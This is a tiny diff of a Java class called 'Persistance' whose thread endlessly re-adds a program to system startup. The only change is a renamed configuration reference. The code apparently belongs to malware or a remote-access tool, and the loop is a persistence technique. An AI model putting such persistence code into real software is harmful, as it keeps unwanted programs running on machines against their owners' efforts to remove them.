@@ -12,7 +12,7 @@ public class Persistance extends Thread {
 	public void run() {
 		while (true) {
 			try {
-				Startup.addToStartup(Main.name);
+				Startup.addToStartup(Configuration.name);
 
 				Thread.sleep(ms);
 			} catch (Exception ex) {
